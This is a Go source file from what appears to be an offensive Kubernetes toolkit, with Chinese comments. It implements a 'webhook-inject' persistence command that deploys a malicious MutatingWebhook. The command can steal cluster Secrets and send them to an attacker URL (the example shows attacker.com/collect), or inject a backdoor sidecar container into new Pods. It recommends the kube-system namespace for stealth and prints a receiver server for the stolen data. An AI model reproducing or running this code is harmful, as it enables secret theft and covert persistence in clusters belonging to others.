package persist

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"kctl/config"
	"kctl/internal/client/k8s"
	"kctl/internal/output"
	"kctl/internal/persist"
	"kctl/internal/session"
	"kctl/pkg/types"
	"kctl/utils/Ask"
)

// WebhookInjectCmd webhook-inject 子命令
type WebhookInjectCmd struct{}

func init() {
	Register(&WebhookInjectCmd{})
}

func (c *WebhookInjectCmd) Name() string      { return "webhook-inject" }
func (c *WebhookInjectCmd) Aliases() []string { return []string{"wi", "webhook"} }
func (c *WebhookInjectCmd) Description() string {
	return "通过恶意 Admission Webhook 实现持久化"
}

func (c *WebhookInjectCmd) Usage() string {
	return `persist webhook-inject [选项]

通过部署恶意 MutatingWebhook 实现持久化

支持的攻击类型:
  secret-exfil    窃取 Secret 内容并外泄到指定服务器
  pod-backdoor    在 Pod 创建时注入恶意 sidecar 容器

部署模式:
  1. 集群内部署 (默认): 在集群内部署 Webhook 服务 (Go 二进制，约 6MB)
  2. 外部 URL 模式: 使用外部服务器作为 Webhook 端点 (--external-url)

选项:
  -t, --type          攻击类型 (secret-exfil/pod-backdoor)
  -n, --namespace     Webhook 服务部署命名空间
  --exfil-url         外泄目标 URL (secret-exfil 类型)
  --image             后门容器镜像 (pod-backdoor 类型)
  --command           后门容器命令，逗号分隔
  --target-ns         目标命名空间，逗号分隔
  --webhook-image     Webhook 服务镜像
  --external-url      使用外部 URL 作为 Webhook 端点
  --cert-dir          证书保存目录 (外部模式，默认输出到终端)
  --dry-run           仅预览，不实际执行

示例:
  persist webhook-inject
  persist webhook-inject -t secret-exfil --exfil-url https://attacker.com/collect
  persist webhook-inject -t pod-backdoor --image busybox --command "sh,-c,sleep infinity"
  persist webhook-inject --external-url https://my-server.com/webhook --cert-dir ./certs`
}

func (c *WebhookInjectCmd) Execute(sess *session.Session, args []string) error {
	p := sess.Printer
	ctx := context.Background()

	// 帮助
	if hasHelpFlag(args) {
		p.Println(c.Usage())
		return nil
	}

	// 解析参数
	opts, err := c.parseArgs(args)
	if err != nil {
		return err
	}

	// 创建 K8s 客户端
	k8sClient, err := createK8sClient(sess, opts.ServerURL, opts.Token)
	if err != nil {
		return err
	}

	// 交互式收集参数
	if err := c.collectOptions(ctx, k8sClient, opts, p); err != nil {
		return err
	}

	// 显示预览
	p.Println()
	p.Println(persist.FormatWebhookPreview(opts))

	if opts.DryRun {
		p.Printf("%s Dry run mode - no changes applied\n", p.Colored(config.ColorYellow, "[!]"))
		return nil
	}

	// 确认执行
	if !Ask.ForSure("确认部署恶意 Webhook?") {
		p.Printf("%s Operation cancelled\n", p.Colored(config.ColorYellow, "[!]"))
		return nil
	}

	// 部署
	p.Printf("%s Deploying webhook...\n", p.Colored(config.ColorBlue, "[*]"))
	deployment, err := persist.DeployWebhook(ctx, k8sClient, opts)
	if err != nil {
		return fmt.Errorf("部署 Webhook 失败: %w", err)
	}

	// 显示结果
	c.printResult(p, deployment, opts)
	return nil
}

// collectOptions 交互式收集缺失的参数
func (c *WebhookInjectCmd) collectOptions(ctx context.Context, client k8s.Client, opts *types.WebhookInjectOptions, p output.Printer) error {
	// 选择攻击类型
	if opts.AttackType == "" {
		attackOptions := make([]Ask.SelectOption, len(types.WebhookAttackTemplates))
		for i, t := range types.WebhookAttackTemplates {
			attackOptions[i] = Ask.SelectOption{Label: string(t.Type), Value: string(t.Type), Description: t.Description}
		}
		selected, err := Ask.SelectOne("选择攻击类型:", attackOptions)
		if err != nil {
			return fmt.Errorf("选择攻击类型失败: %w", err)
		}
		opts.AttackType = types.WebhookAttackType(selected)
	}

	// 根据攻击类型收集参数
	switch opts.AttackType {
	case types.WebhookAttackSecretExfil:
		if opts.ExfilURL == "" {
			url, err := Ask.InputRequired("外泄目标 URL:", "")
			if err != nil {
				return fmt.Errorf("输入 URL 失败: %w", err)
			}
			opts.ExfilURL = ensureHTTPS(url)
		}

	case types.WebhookAttackPodBackdoor:
		if opts.BackdoorImage == "" {
			image, err := Ask.InputRequired("后门容器镜像:", "busybox")
			if err != nil {
				return fmt.Errorf("输入镜像失败: %w", err)
			}
			opts.BackdoorImage = image
		}
		if len(opts.BackdoorCommand) == 0 {
			cmdStr, err := Ask.InputRequired("后门容器命令 (逗号分隔):", "sh,-c,sleep infinity")
			if err != nil {
				return fmt.Errorf("输入命令失败: %w", err)
			}
			opts.BackdoorCommand = strings.Split(cmdStr, ",")
		}
		if opts.BackdoorName == "" {
			opts.BackdoorName = config.DefaultBackdoorContainerName
		}

	default:
		return fmt.Errorf("不支持的攻击类型: %s", opts.AttackType)
	}

	// 集群内部署模式：选择命名空间
	if opts.ExternalURL == "" && opts.Namespace == "" {
		p.Printf("%s Fetching namespaces...\n", p.Colored(config.ColorBlue, "[*]"))
		namespaces, err := client.ListNamespaces(ctx)
		if err != nil {
			return fmt.Errorf("获取命名空间失败: %w", err)
		}

		nsOptions := []Ask.SelectOption{
			{Label: "kube-system", Value: "kube-system", Description: "系统命名空间 (更隐蔽)"},
			{Label: "default", Value: "default", Description: "默认命名空间"},
		}
		for _, ns := range namespaces {
			if ns != "kube-system" && ns != "default" && !strings.HasPrefix(ns, "kube-") {
				nsOptions = append(nsOptions, Ask.SelectOption{Label: ns, Value: ns})
			}
		}

		selected, err := Ask.SelectOne("选择 Webhook 服务部署命名空间:", nsOptions)
		if err != nil {
			return fmt.Errorf("选择命名空间失败: %w", err)
		}
		opts.Namespace = selected
	}

	// 选择目标命名空间
	if len(opts.TargetNamespaces) == 0 && !Ask.ForSure("是否拦截所有命名空间? (排除系统命名空间)") {
		namespaces, _ := client.ListNamespaces(ctx)
		var nsOptions []Ask.SelectOption
		for _, ns := range namespaces {
			if !strings.HasPrefix(ns, "kube-") && ns != opts.Namespace {
				nsOptions = append(nsOptions, Ask.SelectOption{Label: ns, Value: ns})
			}
		}
		if len(nsOptions) > 0 {
			selected, err := Ask.SelectMultiple("选择目标命名空间:", nsOptions)
			if err != nil {
				return fmt.Errorf("选择目标命名空间失败: %w", err)
			}
			opts.TargetNamespaces = selected
		}
	}

	return nil
}

// printResult 打印部署结果
func (c *WebhookInjectCmd) printResult(p output.Printer, deployment *types.WebhookDeployment, opts *types.WebhookInjectOptions) {
	p.Printf("%s Webhook deployed successfully!\n", p.Colored(config.ColorGreen, "[+]"))
	p.Println()
	p.Printf("%s Webhook Name: %s\n", p.Colored(config.ColorBlue, "[*]"), deployment.WebhookName)

	if deployment.ExternalURL != "" {
		p.Printf("%s External URL: %s\n", p.Colored(config.ColorBlue, "[*]"), deployment.ExternalURL)
		if deployment.Cert != nil {
			c.handleCertOutput(p, deployment, opts.CertDir)
		}
	} else {
		p.Printf("%s Service: %s/%s\n", p.Colored(config.ColorBlue, "[*]"), deployment.Namespace, deployment.ServiceName)
	}

	p.Println()
	p.Printf("%s To remove: persist webhook-restore --name %s\n", p.Colored(config.ColorYellow, "[!]"), deployment.WebhookName)
}

// handleCertOutput 处理证书输出（保存到文件或打印到终端）
func (c *WebhookInjectCmd) handleCertOutput(p output.Printer, deployment *types.WebhookDeployment, certDir string) {
	cert := deployment.Cert
	p.Println()

	if certDir != "" {
		// 保存到文件
		if err := c.saveCertFiles(certDir, cert); err != nil {
			p.Printf("%s Failed to save certificates: %s\n", p.Colored(config.ColorRed, "[-]"), err)
			p.Println()
			c.printCertToTerminal(p, cert)
			return
		}

		p.Printf("%s Certificates saved to %s/\n", p.Colored(config.ColorGreen, "[+]"), certDir)
		p.Println("  - tls.crt  (server certificate)")
		p.Println("  - tls.key  (server private key)")
		p.Println("  - ca.crt   (CA certificate)")
		p.Println()
		p.Printf("%s Start your HTTPS server with:\n", p.Colored(config.ColorYellow, "[!]"))
		p.Println()
		p.Printf("  # Python example:\n")
		p.Printf("  python -c \"\n")
		p.Printf("  from http.server import HTTPServer, BaseHTTPRequestHandler\n")
		p.Printf("  import ssl, json\n")
		p.Printf("  class Handler(BaseHTTPRequestHandler):\n")
		p.Printf("      def do_POST(self):\n")
		p.Printf("          data = self.rfile.read(int(self.headers['Content-Length']))\n")
		p.Printf("          print(json.dumps(json.loads(data), indent=2))\n")
		p.Printf("          self.send_response(200)\n")
		p.Printf("          self.send_header('Content-Type', 'application/json')\n")
		p.Printf("          self.end_headers()\n")
		p.Printf("          self.wfile.write(b'{\\\"apiVersion\\\":\\\"admission.k8s.io/v1\\\",\\\"kind\\\":\\\"AdmissionReview\\\",\\\"response\\\":{\\\"uid\\\":\\\"\\\",\\\"allowed\\\":true}}')\n")
		p.Printf("  ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n")
		p.Printf("  ctx.load_cert_chain('%s/tls.crt', '%s/tls.key')\n", certDir, certDir)
		p.Printf("  HTTPServer(('0.0.0.0', 8443), Handler).socket = ctx.wrap_socket(HTTPServer(('0.0.0.0', 8443), Handler).socket, server_side=True)\n")
		p.Printf("  HTTPServer(('0.0.0.0', 8443), Handler).serve_forever()\n")
		p.Printf("  \"\n")
	} else {
		// 打印到终端并提供复制命令
		p.Printf("%s Certificate generated for external server.\n", p.Colored(config.ColorYellow, "[!]"))
		p.Println()
		p.Println("Option 1: Save certificates manually")
		p.Println("  Copy the content below to files: tls.crt, tls.key, ca.crt")
		p.Println()
		p.Println("Option 2: Use these commands to save certificates:")
		p.Println()
		p.Printf("  mkdir -p ./webhook-certs && \\\n")
		p.Printf("  cat > ./webhook-certs/tls.crt << 'EOF'\n")
		p.Printf("%s", string(cert.ServerCert))
		p.Printf("EOF\n")
		p.Println()
		p.Printf("  cat > ./webhook-certs/tls.key << 'EOF'\n")
		p.Printf("%s", string(cert.ServerKey))
		p.Printf("EOF\n")
		p.Println()
		p.Printf("  cat > ./webhook-certs/ca.crt << 'EOF'\n")
		p.Printf("%s", string(cert.CACert))
		p.Printf("EOF\n")
	}
}

// saveCertFiles 保存证书到文件
func (c *WebhookInjectCmd) saveCertFiles(dir string, cert *types.WebhookCert) error {
	// 创建目录
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("创建目录失败: %w", err)
	}

	files := map[string][]byte{
		"tls.crt": cert.ServerCert,
		"tls.key": cert.ServerKey,
		"ca.crt":  cert.CACert,
	}

	for name, content := range files {
		path := filepath.Join(dir, name)
		perm := os.FileMode(0644)
		if name == "tls.key" {
			perm = 0600 // 私钥权限更严格
		}
		if err := os.WriteFile(path, content, perm); err != nil {
			return fmt.Errorf("写入 %s 失败: %w", name, err)
		}
	}

	return nil
}

// printCertToTerminal 打印证书到终端（备用方案）
func (c *WebhookInjectCmd) printCertToTerminal(p output.Printer, cert *types.WebhookCert) {
	p.Println("  === Server Certificate (tls.crt) ===")
	p.Println(string(cert.ServerCert))
	p.Println("  === Server Private Key (tls.key) ===")
	p.Println(string(cert.ServerKey))
	p.Println("  === CA Certificate (ca.crt) ===")
	p.Println(string(cert.CACert))
}

// parseArgs 解析命令行参数
func (c *WebhookInjectCmd) parseArgs(args []string) (*types.WebhookInjectOptions, error) {
	opts := &types.WebhookInjectOptions{}

	for i := 0; i < len(args); i++ {
		arg := args[i]

		// 获取下一个参数值
		getNext := func(name string) (string, error) {
			if i+1 >= len(args) {
				return "", fmt.Errorf("%s 需要参数", name)
			}
			i++
			return args[i], nil
		}

		var err error
		var v string

		switch arg {
		case "--type", "-t":
			if v, err = getNext(arg); err == nil {
				opts.AttackType = types.WebhookAttackType(v)
			}
		case "--namespace", "-n":
			if v, err = getNext(arg); err == nil {
				opts.Namespace = v
			}
		case "--exfil-url":
			if v, err = getNext(arg); err == nil {
				opts.ExfilURL = v
			}
		case "--image":
			if v, err = getNext(arg); err == nil {
				opts.BackdoorImage = v
			}
		case "--command":
			if v, err = getNext(arg); err == nil {
				opts.BackdoorCommand = strings.Split(v, ",")
			}
		case "--backdoor-name":
			if v, err = getNext(arg); err == nil {
				opts.BackdoorName = v
			}
		case "--target-ns":
			if v, err = getNext(arg); err == nil {
				opts.TargetNamespaces = strings.Split(v, ",")
			}
		case "--webhook-image":
			if v, err = getNext(arg); err == nil {
				opts.WebhookImage = v
			}
		case "--external-url":
			if v, err = getNext(arg); err == nil {
				opts.ExternalURL = v
			}
		case "--cert-dir":
			if v, err = getNext(arg); err == nil {
				opts.CertDir = v
			}
		case "--server":
			if v, err = getNext(arg); err == nil {
				opts.ServerURL = v
			}
		case "--token":
			if v, err = getNext(arg); err == nil {
				opts.Token = v
			}
		case "--dry-run":
			opts.DryRun = true
		default:
			if strings.HasPrefix(arg, "-") {
				return nil, fmt.Errorf("未知选项: %s", arg)
			}
		}

		if err != nil {
			return nil, err
		}
	}

	return opts, nil
}

// hasHelpFlag 检查是否有帮助标志
func hasHelpFlag(args []string) bool {
	for _, arg := range args {
		if arg == "--help" || arg == "-h" {
			return true
		}
	}
	return false
}

// ensureHTTPS 确保 URL 有 https 前缀
func ensureHTTPS(url string) string {
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		return "https://" + url
	}
	return url
}
